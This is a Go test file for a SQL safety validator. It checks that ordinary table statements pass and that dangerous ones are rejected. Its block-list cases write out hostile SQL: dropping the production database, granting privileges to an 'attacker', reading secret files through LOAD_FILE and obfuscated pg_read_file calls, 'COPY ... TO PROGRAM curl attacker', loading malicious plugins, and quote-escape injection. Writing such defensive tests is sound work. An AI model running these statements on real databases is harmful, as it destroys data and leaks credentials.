package compare

import (
	"testing"

	"github.com/DATA-DOG/go-sqlmock"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestValidateSQLSafetyAllowsTableWorkloads(t *testing.T) {
	for _, statement := range []string{
		"SELECT 'INTO OUTFILE is text'",
		"CREATE TABLE test.t (id BIGINT)",
		"CREATE TEMPORARY TABLE test.t (id BIGINT)",
		"CREATE UNIQUE INDEX idx_t_id ON test.t (id)",
		"CREATE OR REPLACE VIEW test.v AS SELECT id FROM test.t",
		"DROP TABLE test.t",
		"INSERT INTO test.t VALUES (1)",
		"UPDATE test.t SET id = 2",
		"DELETE FROM test.t",
		"SET @value = 1",
	} {
		assert.NoError(t, validateSQLSafety(statement), statement)
	}
}

func TestDatabaseExecutionRejectsUnsafeSQL(t *testing.T) {
	db, mock, err := sqlmock.New()
	require.NoError(t, err)
	defer db.Close()

	_, err = query(db, "DROP DATABASE production")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "safety policy")

	_, err = exec(db, "GRANT ALL ON *.* TO attacker")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "safety policy")

	_, err = ExecSqlsInDbs([]string{"SELECT LOAD_FILE('/run/secrets/value')"}, db)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "safety policy")

	assert.NoError(t, mock.ExpectationsWereMet())
}

func TestValidateSQLSafetyBlocksPrivilegedOperations(t *testing.T) {
	for _, statement := range []string{
		"GRANT ALL ON *.* TO attacker",
		"REVOKE ALL ON *.* FROM attacker",
		"CREATE USER attacker IDENTIFIED BY 'x'",
		"DROP DATABASE production",
		"/* ordinary comment */ DROP DATABASE production",
		"/*!50000 DROP DATABASE production */",
		"/*M!100100 DROP DATABASE production */",
		"SET GLOBAL general_log = ON",
		"RENAME USER old TO new",
		"SET PASSWORD FOR user = 'x'",
		"SET ROLE admin",
		"SET SESSION AUTHORIZATION admin",
		"CREATE SERVER external FOREIGN DATA WRAPPER mysql OPTIONS (HOST 'remote')",
		"CREATE OR REPLACE FUNCTION dangerous() RETURNS void AS 'x' LANGUAGE c",
		"CREATE DEFINER = CURRENT_USER PROCEDURE dangerous() SELECT 1",
		"CREATE IF NOT EXISTS USER attacker IDENTIFIED BY 'x'",
		"ALTER SERVER external OPTIONS (SET HOST 'remote')",
		"DROP SERVER external",
		"SELECT secret INTO OUTFILE '/tmp/leak' FROM credentials",
		"SELECT LOAD_FILE('/run/secrets/randgen-dsn')",
		"LOAD DATA LOCAL INFILE '/tmp/input' INTO TABLE test.t",
		"COPY test.t TO PROGRAM 'curl attacker'",
		"ATTACH DATABASE '/run/secrets/value' AS stolen",
		"SELECT pg_read_file('/run/secrets/value')",
		`SELECT "pg_read_file"('/run/secrets/value')`,
		`SELECT U&"pg\005Fread\005Ffile"('/run/secrets/value')`,
		"SELECT `load_file`('/run/secrets/value')",
		"SELECT load_extension('/tmp/malicious.so')",
		"ALTER SYSTEM SET shared_preload_libraries = 'malicious'",
		"INSTALL PLUGIN malicious SONAME 'malicious.so'",
		"PREPARE stmt FROM 'DROP DATABASE production'",
		"EXECUTE stmt",
		"CALL privileged_procedure()",
		`SELECT 'safe\'; DROP DATABASE production`,
		`SELECT 'safe\'; SELECT pg_read_file('/run/secrets/value')`,
	} {
		err := validateSQLSafety(statement)
		if assert.Error(t, err, statement) {
			assert.NotContains(t, err.Error(), statement)
		}
	}
}
